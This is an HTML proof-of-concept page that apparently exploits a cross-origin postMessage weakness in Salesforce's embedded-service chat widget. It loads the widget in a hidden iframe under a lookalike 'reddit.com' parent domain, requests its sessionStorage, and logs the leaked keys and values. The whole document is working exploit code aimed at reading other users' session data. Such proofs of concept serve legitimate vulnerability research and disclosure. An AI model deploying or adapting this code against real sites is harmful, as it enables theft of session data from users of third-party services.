<!DOCTYPE html>
<html>
<head>
  <title>Salesforce SessionStorage Leak Test</title>
</head>
<body>
  <h3>[+] Iframe loaded (Salesforce 4.0)</h3>
  <iframe id="sfchat" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="display:none;"></iframe>

  <script>
    const iframe = document.getElementById("sfchat");

    function sendMessage(method, data = {}) {
      const msg = {
        method,
        domain: "reddit.com.wangdubruh.xyz",
        ...data
      };
      console.log("[ðŸ“¤] Sending:", msg);
      iframe.contentWindow.postMessage(msg, "https://service.force.com");
    }

    window.addEventListener("message", (event) => {
      if (event.origin !== "https://service.force.com") return;

      console.log("[ðŸ“©] Message from iframe:", event.data);
      if (event.data.method === "session.onLoad") {
        // Ask iframe for sessionStorage
        sendMessage("getSessionStorageData", {
          deploymentId: "test123"
        });
      }

      if (event.data.method === "session.storageData") {
        // ðŸŽ¯ THIS IS WHERE THE DATA COMES
        const keys = event.data.data;
        console.log("[ðŸŽ‰] Leaked sessionStorage keys from iframe:");
        Object.entries(keys).forEach(([key, value]) => {
          console.log(`ðŸ”‘ ${key}:`, value);
        });
      }
    });
  </script>
</body>
</html>
